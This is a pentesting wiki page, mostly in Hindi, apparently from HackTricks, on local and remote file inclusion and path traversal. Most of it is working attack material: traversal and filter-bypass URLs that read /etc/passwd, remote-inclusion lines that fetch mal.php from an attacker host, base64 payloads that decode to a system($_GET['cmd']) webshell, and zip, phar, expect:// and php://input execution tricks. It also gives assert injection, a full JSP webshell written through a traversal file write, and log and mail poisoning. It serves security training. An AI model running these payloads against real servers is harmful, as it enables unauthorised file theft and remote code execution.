# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** फ़ाइल एक remote server से लोड होती है (सबसे अच्छा: आप कोड लिख सकते हैं और server उसे execute करेगा). In php this is **disabled** by default (**allow_url_include**).\
**Local File Inclusion (LFI):** सर्वर एक local फ़ाइल लोड करता है.

यह vulnerability तब मौजूद होती है जब उपयोगकर्ता किसी तरह उस फ़ाइल को नियंत्रित कर सके जिसे server लोड करने वाला है.

प्रभावित **PHP functions**: require, require_once, include, include_once

इस vulnerability का exploit करने के लिए एक उपयोगी टूल: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**कई \*nix LFI सूचियाँ मिलाकर और अधिक paths जोड़कर मैंने यह बनाया है:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

यह भी आज़माएँ `/` को `\` से बदलना\
यह भी आज़माएँ: `../../../../../` जोड़ना

एक सूची जो कई तकनीकों का उपयोग करके फ़ाइल /etc/password खोजती है (जाँचने के लिए कि vulnerability मौजूद है) [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) पर मिल सकती है।

### **Windows**

विभिन्न wordlists का संयोजन:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

यह भी आज़माएँ `/` को `\` से बदलना\
यह भी आज़माएँ: `C:/` हटाएँ और `../../../../../` जोड़ें

एक सूची जो कई तकनीकों का उपयोग करके फ़ाइल /boot.ini खोजती है (जाँचने के लिए कि vulnerability मौजूद है) [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) पर मिल सकती है।

### **OS X**

Linux की LFI सूची देखें।

## बेसिक LFI और बाइपास

सभी उदाहरण Local File Inclusion के लिए हैं लेकिन इन्हें Remote File Inclusion पर भी लागू किया जा सकता है (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences को गैर-आवर्ती तरीके से हटाया गया
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

प्रदान किए गए स्ट्रिंग के अंत में अतिरिक्त chars जोड़ने को Bypass करें (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
यह **PHP 5.4 से सुलझा हुआ है**

### **एन्कोडिंग**

आप गैर-मानक एन्कोडिंग्स जैसे double URL encode (और अन्य) का उपयोग कर सकते हैं:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### From existent folder

शायद back-end फ़ोल्डर पथ की जांच कर रहा है:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### सर्वर पर फ़ाइल सिस्टम निर्देशिकाओं का अन्वेषण

सर्वर के फ़ाइल सिस्टम को कुछ तकनीकों का उपयोग करके रिकर्सिव रूप से खोजा जा सकता है ताकि केवल फाइलें ही नहीं बल्कि निर्देशिकाएँ भी पहचानी जा सकें। इस प्रक्रिया में निर्देशिका की गहराई निर्धारित करना और विशेष फ़ोल्डरों के अस्तित्व के लिए जांच करना शामिल है। इसे प्राप्त करने का विस्तृत तरीका नीचे दिया गया है:

1. **निर्देशिका की गहराई निर्धारित करें:** अपने वर्तमान निर्देशिका की गहराई का निर्धारण /etc/passwd फ़ाइल को सफलतापूर्वक लाकर करें (यदि सर्वर Linux-आधारित हो तो लागू)। एक उदाहरण URL इस तरह संरचित हो सकता है, जो तीन की गहराई दिखाता है:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** अनुमानित फ़ोल्डर का नाम (उदाहरण के लिए, `private`) URL में जोड़ें, फिर `/etc/passwd` पर वापस जाएँ। अतिरिक्त डायरेक्टरी स्तर के लिए depth को एक बढ़ाना होगा:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **परिणामों की व्याख्या करें:** सर्वर की प्रतिक्रिया यह बताती है कि फ़ोल्डर मौजूद है या नहीं:
- **त्रुटि / कोई आउटपुट नहीं:** दिए गए स्थान पर `private` फ़ोल्डर संभवतः मौजूद नहीं है।
- **`/etc/passwd` की सामग्री:** `private` फ़ोल्डर मौजूद होने की पुष्टि होती है।
4. **रिकर्सिव अन्वेषण:** खोजे गए फ़ोल्डरों की आगे की जांच समान तकनीक या पारंपरिक Local File Inclusion (LFI) तरीकों का उपयोग करके उप-डायरेक्टरी या फ़ाइलों के लिए की जा सकती है।

फ़ाइल सिस्टम के विभिन्न स्थानों पर डायरेक्टरीज़ का अन्वेषण करने के लिए, payload को तदनुसार समायोजित करें। उदाहरण के लिए, यह जांचने के लिए कि क्या `/var/www/` में `private` डायरेक्टरी है (मान लेते हैं कि वर्तमान डायरेक्टरी 3 की गहराई पर है), उपयोग करें:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation वेब एप्लिकेशनों में फ़ाइल पथों को हेरफेर करने की एक विधि है। यह अक्सर उन प्रतिबंधित फ़ाइलों तक पहुँचने के लिए इस्तेमाल किया जाता है जिनमें सुरक्षा उपाय फ़ाइल पथ के अंत में अतिरिक्त अक्षर जोड़ते हैं और उनको बायपास करना संभव हो सके। लक्ष्य ऐसा फ़ाइल पथ तैयार करना है जो सुरक्षा उपाय द्वारा बदलने पर भी इच्छित फ़ाइल की ओर इशारा करते रहे।

In PHP, फ़ाइल सिस्टम की प्रकृति के कारण फ़ाइल पथ के विभिन्न प्रतिनिधित्व समान माने जा सकते हैं। उदाहरण के लिए:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, और `/etc/passwd/` को समान path माना जाता है।
- जब अंतिम 6 अक्षर `passwd` हों, तो अंत में `/` जोड़ने से (यानी `passwd/`) लक्षित फ़ाइल नहीं बदलती।
- इसी तरह, यदि किसी फ़ाइल पथ के अंत में `.php` जुड़ा हो (जैसे `shellcode.php`), तो अंत में `/.` जोड़ने से एक्सेस की जा रही फ़ाइल पर असर नहीं पड़ेगा।

नीचे दिए गए उदाहरण दिखाते हैं कि किस प्रकार path truncation का उपयोग करके `/etc/passwd` तक पहुँच बनाई जा सकती है, जो उसकी संवेदनशील सामग्री (उपयोगकर्ता खाता जानकारी) के कारण एक सामान्य लक्ष्य है:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In these scenarios, the number of traversals needed might be around 2027, but this number can vary based on the server's configuration.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) combined with extra dot segments and characters can be used to navigate the file system, effectively ignoring appended strings by the server.
- **Determining the Required Number of Traversals**: Through trial and error, one can find the precise number of `../` sequences needed to navigate to the root directory and then to `/etc/passwd`, ensuring that any appended strings (like `.php`) are neutralized but the desired path (`/etc/passwd`) remains intact.
- **Starting with a Fake Directory**: It's a common practice to begin the path with a non-existent directory (like `a/`). This technique is used as a precautionary measure or to fulfill the requirements of the server's path parsing logic.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php में यह डिफ़ॉल्ट रूप से निष्क्रिय होता है क्योंकि **`allow_url_include`** **Off.** इसे काम करने के लिए **On** होना चाहिए, और उस स्थिति में आप अपने server से एक PHP फ़ाइल include करके RCE प्राप्त कर सकते हैं:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
यदि किसी कारणवश **`allow_url_include`** **On** है, लेकिन PHP बाहरी वेबपेजों तक पहुँच को **filtering** कर रहा है, [इस पोस्ट के अनुसार](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), आप उदाहरण के लिए data protocol का उपयोग base64 के साथ कर सकते हैं ताकि b64 PHP कोड को decode करने और egt RCE पाने के लिए:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> पिछले कोड में, अंतिम `+.txt` इसलिए जोड़ा गया था क्योंकि attacker को ऐसी string चाहिए थी जो `.txt` पर समाप्त हो; इसलिए string उसी के साथ खत्म होती है और b64 decode के बाद वह हिस्सा सिर्फ जंक लौटाएगा और असली PHP code शामिल (और इसलिए, executed) होगा।
>
> एक और उदाहरण जो **`php://` protocol का उपयोग न करने वाला** होगा:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python रूट एलिमेंट

Python में, इस तरह के कोड में:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
यदि उपयोगकर्ता **absolute path** को **`file_name`** के रूप में पास करता है, तो **previous path बस हटा दिया जाता है**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
यह [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) के अनुसार इच्छित व्यवहार है:

> अगर कोई घटक absolute path है, तो सभी पिछले घटक हटा दिए जाते हैं और joining absolute path घटक से जारी रहती है।

## Java डायरेक्टरी सूची

ऐसा लगता है कि अगर आपके पास Java में एक Path Traversal है और आप फ़ाइल की बजाय **डायरेक्टरी के लिए अनुरोध करते हैं**, तो **डायरेक्टरी की सूची वापस की जाती है**। यह अन्य भाषाओं में नहीं होगा (जहां तक मुझे पता है)।

## शीर्ष 25 पैरामीटर

यहाँ शीर्ष 25 पैरामीटरों की सूची है जो local file inclusion (LFI) कमजोरियों के लिए संवेदनशील हो सकते हैं (स्रोत: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters डेटा को पढ़े या लिखा जाने से पहले बुनियादी **संशोधन ऑपरेशन** करने की अनुमति देते हैं। फ़िल्टर की 5 श्रेणियाँ हैं:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : किसी अलग encoding में बदलता है (`convert.iconv.<input_enc>.<output_enc>`). सभी supported एन्कोडिंग्स की **सूची** प्राप्त करने के लिए कंसोल में चलाएँ: `iconv -l`

> [!WARNING]
> `convert.iconv.*` conversion filter का दुरुपयोग करके आप **मनमाना टेक्स्ट** जनरेट कर सकते हैं, जो मनमाना टेक्स्ट लिखने या include जैसी फ़ंक्शन को मनमाना टेक्स्ट प्रोसेस करने योग्य बनाने में उपयोगी हो सकता है। अधिक जानकारी के लिए देखें [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: सामग्री को compress करता है (यदि बहुत सारा info exfiltrating करना हो तो उपयोगी)
- `zlib.inflate`: डेटा को decompress करता है
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Other Filters
- PHP में `var_dump(stream_get_filters());` चलाने पर आप कुछ **अनपेक्षित फिल्टर** पाएंगे:
- `consumed`
- `dechunk`: HTTP chunked encoding को reverse करता है
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> भाग "php://filter" case-insensitive है

### php filters को oracle के रूप में उपयोग करके arbitrary files पढ़ना

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) में एक तकनीक प्रस्तावित की गई है जो सर्वर से आउटपुट वापस न मिलने पर भी एक local file पढ़ने की अनुमति देती है। यह तकनीक php filters को oracle के रूप में उपयोग करके फ़ाइल की **boolean exfiltration (char by char)** पर आधारित है। ऐसा इसलिए है क्योंकि php filters का उपयोग टेक्स्ट को इतना बड़ा बनाने के लिए किया जा सकता है कि php एक exception फेंक दे।

Original post में तकनीक का विस्तृत विवरण मिलता है, लेकिन यहाँ एक संक्षिप्त सारांश है:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- यह, पिछले वाले के साथ मिलकर (और अनुमानित अक्षर पर निर्भर अन्य filters के साथ), हमें टेक्स्ट के शुरूआत के एक अक्षर का अनुमान लगाने की अनुमति देगा — जब हम पर्याप्त transformations करते हैं ताकि वह अब hexadecimal character न रहे। क्योंकि अगर hex है तो dechunk उसे नहीं हटाएगा और शुरुआती बम php error ट्रिगर करेगा।
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the desired bit to leak.

पोस्ट में इसे ऑटोमेट करने के लिए एक टूल भी leak किया गया: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

यह wrapper प्रोसेस के द्वारा खुले हुए file descriptors तक पहुँचने की अनुमति देता है। खुले हुए फ़ाइलों की सामग्री exfiltrate करने के लिए संभावित रूप से उपयोगी:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
आप **php://stdin, php://stdout and php://stderr** का उपयोग करके क्रमशः **file descriptors 0, 1 and 2** तक भी पहुँच सकते हैं (निश्चित नहीं कि यह किसी हमले में कैसे उपयोगी हो सकता है)

### zip:// and rar://

एक Zip या Rar फ़ाइल अपलोड करें जिसमें एक PHPShell अंदर हो और उसे एक्सेस करें.\
rar protocol का दुरुपयोग करने में सक्षम होने के लिए इसे **विशेष रूप से सक्रिय किया जाना चाहिए**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ध्यान दें कि यह प्रोटोकॉल php कॉन्फ़िगरेशन **`allow_url_open`** और **`allow_url_include`** द्वारा प्रतिबंधित है

### expect://

Expect को सक्रिय होना चाहिए। आप इसका उपयोग करके कोड चला सकते हैं:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST पैरामीटरों में अपना payload निर्दिष्ट करें:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

एक `.phar` फ़ाइल का उपयोग तब PHP कोड चलाने के लिए किया जा सकता है जब कोई वेब एप्लिकेशन फ़ाइल लोड करने के लिए `include` जैसे फ़ंक्शन का उपयोग करता है। नीचे दिया गया PHP कोड स्निपेट एक `.phar` फ़ाइल बनाने का उदाहरण दिखाता है:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` फ़ाइल को कंपाइल करने के लिए, निम्नलिखित कमांड चलाया जाना चाहिए:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

ऐसे मामलों में जहाँ LFI केवल फ़ाइल पढ़ता है और उसके अंदर के PHP कोड को निष्पादित नहीं करता — उदाहरण के लिए `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, या `filesize()` के माध्यम से — तो deserialization vulnerability के शोषण का प्रयास किया जा सकता है। यह vulnerability `phar` प्रोटोकॉल का उपयोग करके फ़ाइल पढ़ने से जुड़ी हुई है।

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
संक्षेप में: PHP heap में एक **3 byte overflow** का दुरुपयोग करके free chunks की chain को बदल कर एक विशिष्ट आकार के chunks के साथ ऐसा करना संभव हुआ ताकि किसी भी address में कुछ भी लिखा जा सके, और इसलिए एक hook `system` को कॉल करने के लिए जोड़ा गया।\
अधिक php filters का दुरुपयोग करके विशिष्ट आकार के chunks को alloc करना संभव था।

### और प्रोटोकॉल

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — मेमोरी में या एक अस्थायी फ़ाइल में लिखता है (not sure how this can be useful in a file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — स्थानीय फ़ाइल सिस्टम तक पहुँच
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLs तक पहुँच
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLs तक पहुँच
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — pattern से मेल खाने वाले pathnames खोजता है (यह कुछ भी प्रिंटेबल नहीं लौटाता, इसलिए यहाँ वास्तव में उपयोगी नहीं है)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — ऑडियो स्ट्रीम्स (Not useful to read arbitrary files)

## PHP के 'assert' के माध्यम से LFI

PHP में 'assert' function के साथ काम करते समय Local File Inclusion (LFI) का जोखिम काफी अधिक होता है, क्योंकि यह strings के भीतर कोड निष्पादित कर सकता है। यह विशेष रूप से समस्या तब बनती है जब ऐसी इनपुट जिसमें directory traversal characters जैसे ".." हों, की जाँच तो की जा रही हो लेकिन सही तरह से sanitize नहीं की जा रही हो।

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
हालाँकि यह traversal को रोकने का प्रयास करता है, यह अनजाने में code injection के लिए एक vector बना देता है। फ़ाइल की सामग्री पढ़ने के लिए इसे एक्सप्लॉइट करने हेतु, एक attacker उपयोग कर सकता है:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
इसी तरह, arbitrary system commands को execute करने के लिए, कोई निम्नलिखित उपयोग कर सकता है:
```plaintext
' and die(system("id")) or '
```
यह महत्वपूर्ण है कि आप इन **URL-encode these payloads** करें।

## PHP Blind Path Traversal

> [!WARNING]
> यह तकनीक उन मामलों में प्रासंगिक है जहाँ आप किसी **PHP function** के लिए **file path** को नियंत्रित करते हैं जो किसी **file** तक पहुँचता है पर आप फ़ाइल की सामग्री नहीं देख पाएंगे (जैसे एक साधारण कॉल **`file()`**) और सामग्री दिखाई नहीं देती।

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) यह समझाया गया है कि कैसे एक blind path traversal को PHP filter के माध्यम से abuse करके **exfiltrate the content of a file via an error oracle** किया जा सकता है।

सारांश के रूप में, यह तकनीक **"UCS-4LE" encoding** का उपयोग करती है ताकि किसी फ़ाइल की सामग्री इतनी **big** हो जाए कि जिस **PHP function opening** फ़ाइल को खोलता है वह एक **error** trigger कर दे।

फिर, पहले char को leak करने के लिए filter **`dechunk`** का उपयोग किया जाता है साथ ही अन्य जैसे **base64** या **rot13**, और अंत में filters **convert.iconv.UCS-4.UCS-4LE** और **convert.iconv.UTF16.UTF-16BE** का उपयोग करके **place other chars at the beggining and leak them** किया जाता है।

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

जब server-side कोड जोfiles ingest/upload करता है destination path को user-controlled डेटा (उदा., filename या URL) से बनाता है बिना इसे canonicalising और validating किए, तो `..` segments और absolute paths intended directory से बाहर निकलकर arbitrary file write कर सकते हैं। अगर आप payload को किसी web-exposed directory में रख सकें, तो आम तौर पर आप webshell drop करके unauthenticated RCE प्राप्त कर लेते हैं।

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- एक traversal path craft करें जो intended storage directory से webroot में निकल जाए, और अपनी webshell content शामिल करें।
- ड्रॉप किए गए payload पर ब्राउज़ करें और कमांड execute करें।

Notes:
- वह vulnerable service जो write करता है वह non-HTTP port पर सुन सकता है (उदा., TCP 4004 पर JMF XML listener)। मुख्य वेब पोर्टल (अलग port) बाद में आपका payload serve करेगा।
- Java स्टैक्स पर, ये file writes अक्सर simple `File`/`Paths` concatenation से implement होते हैं। canonicalisation/allow-listing की कमी मूल दोष है।

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
इन क्लास की बग्स को रोकने वाली हार्डनिंग:
- पाथ को कैनॉनिकल पाथ में resolve करें और सुनिश्चित करें कि यह allow-listed बेस डायरेक्टरी की उप-डायरेक्टरी हो।
- ऐसे किसी भी पाथ को अस्वीकार करें जिसमें `..`, absolute roots, या drive letters शामिल हों; generated filenames को प्राथमिकता दें।
- राइटर को कम-privileged अकाउंट पर चलाएँ और लिखने वाली डायरेक्टरीज़ को served roots से अलग रखें।

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Apache/Nginx log file के माध्यम से

यदि Apache या Nginx server include फ़ंक्शन के भीतर **vulnerable to LFI** है तो आप कोशिश कर सकते हैं कि **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** तक पहुँचें, **user agent** या किसी **GET parameter** के अंदर एक php shell जैसे **`<?php system($_GET['c']); ?>`** सेट करें और उस फाइल को include करें

> [!WARNING]
> ध्यान दें कि **यदि आप shell के लिए double quotes का उपयोग करते हैं** simple quotes की बजाय, तो double quotes स्ट्रिंग "_**quote;**_" में बदल दिए जाएंगे, **PHP एक error फेंकेगा** और **कुछ भी execute नहीं होगा**।
>
> साथ ही, सुनिश्चित करें कि आप **payload को सही ढंग से लिखें** वरना PHP हर बार log फाइल लोड करने की कोशिश पर error देगा और आपको दूसरी बार अवसर नहीं मिलेगा।

यह अन्य logs में भी किया जा सकता है पर **सावधान रहें,** logs के अंदर कोड URL encoded हो सकता है और यह Shell को नष्ट कर सकता है। हेडर **authorisation "basic"** में Base64 में "user:password" होता है और यह logs के अंदर decoded होता है। PHPShell को इस हेडर के अंदर insert किया जा सकता है.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ईमेल के माध्यम से

**एक मेल भेजें** एक आंतरिक खाते (user@localhost) पर जिसमें आपका PHP payload जैसे `<?php echo system($_REQUEST["cmd"]); ?>` हो और उपयोगकर्ता की मेल को इस पथ जैसे **`/var/mail/<USERNAME>`** या **`/var/spool/mail/<USERNAME>`** में include करने का प्रयास करें

### /proc/*/fd/* के माध्यम से

1. बहुत सारी shells अपलोड करें (उदाहरण के लिए: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), जहाँ $PID = प्रोसेस का PID (can be brute forced) और $FD file descriptor है (can be brute forced too)

### /proc/self/environ के माध्यम से

लॉग फ़ाइल की तरह, payload को User-Agent में भेजें, यह /proc/self/environ फ़ाइल के अंदर प्रतिबिंबित होगा
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### अपलोड के माध्यम से

